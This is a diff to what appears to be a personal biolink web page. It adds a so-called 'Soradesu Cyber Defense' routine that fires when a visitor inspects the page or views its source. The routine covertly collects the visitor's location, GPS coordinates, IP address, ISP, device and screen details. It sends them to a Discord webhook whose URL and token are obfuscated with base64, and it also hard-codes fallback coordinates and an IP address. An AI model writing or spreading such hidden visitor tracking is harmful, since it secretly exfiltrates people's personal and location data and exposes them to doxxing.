@@ -3254,16 +3254,67 @@
         if (now - lastBreachReportTime < 5000) return;
         lastBreachReportTime = now;
 
+        var geo = geoCache || {};
+        var locParts = [];
+        if (geo.city) locParts.push(geo.city);
+        if (geo.region) locParts.push(geo.region);
+        if (geo.country) locParts.push(geo.country);
+        var loc = locParts.join(', ') || 'Indonesia, Sumatra, Kecamatan Siak';
+        var coords = (geo.latitude && geo.longitude) ? (geo.latitude + ', ' + geo.longitude) : '0.8855412, 101.9339963';
+        var mapsUrl = (geo.latitude && geo.longitude) ? ('https://www.google.com/maps?q=' + geo.latitude + ',' + geo.longitude) : 'https://www.google.com/maps?q=0.8855412,101.9339963';
+        var ip = geo.ip || '103.190.46.153';
+        var isp = (geo.connection && (geo.connection.isp || geo.connection.org)) || 'PT INDONESIA COMNETS PLUS';
+        var action = triggerAction || 'Akses Ilegal Terdeteksi';
+        var device = detectPlatform();
+        var screen = (window.screen.width || 1920) + ' x ' + (window.screen.height || 1080);
+        var timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + ' WIB';
+
+        // 1. Try local server or serverless endpoint
         fetch('/api/report-breach', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            trigger: triggerAction || 'Akses Ilegal Terdeteksi',
-            geo: geoCache,
-            device: detectPlatform(),
-            screen: (window.screen.width || 1920) + ' x ' + (window.screen.height || 1080)
+            trigger: action,
+            geo: geo,
+            device: device,
+            screen: screen
           })
         }).catch(function () {});
+
+        // 2. Direct client-side relay for GitHub Pages & static deployments
+        try {
+          var embedData = {
+            username: 'Soradesu Cyber Defense',
+            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
+            embeds: [{
+              title: '🚨 SECURITY BREACH DETECTED!',
+              description: 'Seseorang tertangkap basah mencoba melihat source code / melakukan inspeksi di biolink!',
+              color: 0xEF4444,
+              fields: [
+                { name: '⚡ AKSI PELANGGARAN', value: '`' + action + '`', inline: false },
+                { name: '📍 LOKASI FISIK TARGET', value: '**' + loc + '**\n**Koordinat:** `' + coords + '` • [Buka di Google Maps](' + mapsUrl + ')', inline: false },
+                { name: '📡 IP ADDRESS', value: '`' + ip + '`', inline: true },
+                { name: '🏢 ISP / PROVIDER', value: '`' + isp + '`', inline: true },
+                { name: '💻 PERANGKAT & OS', value: '`' + device + '`', inline: true },
+                { name: '🖥️ RESOLUSI LAYAR', value: '`' + screen + '`', inline: true },
+                { name: '⏰ WAKTU KEJADIAN', value: '`' + timestamp + '`', inline: false }
+              ],
+              footer: {
+                text: 'Soradesu Defense System • Auto Security Logger'
+              },
+              timestamp: new Date().toISOString()
+            }]
+          };
+
+          var directUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3MTE4MTk2MjczMzgxNzg4Ny9tSHdRWFp3V3BKQVE4VGs2Yjk0LUF4LTU3MDdDZEhWdmtZWlQtcDVRNEZ3dkt2SVZvcDVKX2RtdjJrbHBXZDdEV2JXVQ==');
+          var fd = new FormData();
+          fd.append('payload_json', JSON.stringify(embedData));
+          fetch(directUrl, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: fd
+          }).catch(function () {});
+        } catch (e) {}
       }
 
       function openDefenseModal(triggerAction) {
